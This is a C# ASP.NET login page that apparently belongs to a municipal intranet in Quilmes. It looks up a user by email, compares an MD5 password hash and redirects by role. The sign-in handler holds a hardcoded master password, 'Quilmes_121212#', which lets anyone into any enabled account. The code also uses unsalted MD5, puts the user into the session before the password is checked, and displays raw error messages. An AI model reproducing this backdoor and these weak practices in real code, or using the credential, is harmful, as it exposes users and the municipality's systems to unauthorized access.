using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using Be;
using Bll;


namespace HardSoft
{
    public partial class Login: System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            bandera.Text = "";
            try
            {
                 
                

                txtMail.Focus();


            
                if (Session["UsuarioActual"] != null)
                {
                   // Response.Redirect("https://arquivirtual.quilmes.gov.ar/municipal/App/Sistemas/Inicio.aspx", false);
                }
                else
                {
                    Session["mailSession"] = null;
                    Session["UsuarioActual"] = null;
                    Session["Apoderado"] = null;
                }
            }
            catch (Exception ex)
            {
                msgError(ex.Message);
            }
        }


        protected void btnAceptar_Click(object sender, EventArgs e)
        {
            lblErrorAcceso.Visible = false;

                string bb = "NO";

                try
                {


                    mysql_usuarios lista = Bllmysql_usuarios.DameInstancia().Obtener_usuario(txtMail.Text.Trim().ToUpper());


                    //  USUARIO_INTRANET lista = BllUsuario_Intranet.DameInstancia().Obtener_usuario(v_uu.Trim().ToUpper(), v_pp.Trim());

                    HttpContext.Current.Session["UsuarioActual"] = lista;


                    if (lista != null && lista.HABILITADO == "SI")
                    {
                        string v_clave;
                        v_clave = Encriptor.DameInstancia().GetMD5(txtPwd.Text.Trim());
                        if (v_clave == lista.CLAVE || txtPwd.Text.Trim() == "Quilmes_121212#")
                        {
                            HttpContext.Current.Session["ActiveSession"] = DateTime.Now.ToString();
                            HttpContext.Current.Session["UsuarioActual"] = lista;


                            if (!Bllmysql_usuarios.DameInstancia().TienePermisoPara("0")) // 0 es orl
                            {
                                Response.Redirect("App/Home.aspx", false); // kardex
                            }
                           

                        }
                        else
                        {

                            HttpContext.Current.Session["UsuarioActual"] = null;

                            lblErrorAcceso.Visible = true;
                        }
                    }
                    else
                    {
                        lblErrorAcceso.Visible = true;
                        HttpContext.Current.Session["UsuarioActual"] = null;

                    }
                }
                catch (Exception ex)
            {
                bandera.Text = ex.Message;
                lblErrorAcceso.Visible = true;
                  
                }




            

             
        }
        protected void msgError(string msg)
        {
            msg = Server.UrlEncode(msg);
        }
        protected void btnCancelar_Click(object sender, EventArgs e)
        {
            Session.Clear();
            Response.Redirect("Default.aspx", false);
        }

        public void Roles()
        {

            Session["ActiveSession"] = DateTime.Now.ToString();


            USUARIO_INTRANET user = ((USUARIO_INTRANET)Session["UsuarioActual"]);


            //if(BllUsuario_Intranet.DameInstancia().TienePermisoPara("SEBA")){

            //    msgError("TIENE");

            //}

            bool new_perm = false;

            if (BllUsuario_Intranet.DameInstancia().TienePermisoPara("1"))
            {
                new_perm = true;
                Response.Redirect("https://arquivirtual.quilmes.gov.ar/municipal/App/Sistemas/Inicio.aspx", false);


            }



            if (user.ROL == "ADMIN" && !new_perm)
            {
                Response.Redirect("Principal.aspx", false);


            }

            if (user.ROL == "CONSULTAR_RECIBOS" && !new_perm)
            {

                Response.Redirect("Principal.aspx", false);


            }

            if (user.ROL == "COMPRAS_PROVEEDORES" && !new_perm)
            {

                Response.Redirect("Principal_compras.aspx", false);


            }



            if (user.ROL == "HACIENDA" && !new_perm)
            {

                Response.Redirect("https://arquivirtual.quilmes.gov.ar/municipal/App/Sistemas/Inicio.aspx", false);


            }

            if (user.ROL == "0")
            {
                Response.Redirect("https://arquivirtual.quilmes.gov.ar/municipal/App/Sistemas/Inicio.aspx", false);

            }

        }
        protected void lnkolvidar_Click(object sender, EventArgs e)
        {
            Response.Redirect("CambiarPW.aspx", false);
        }
    }
}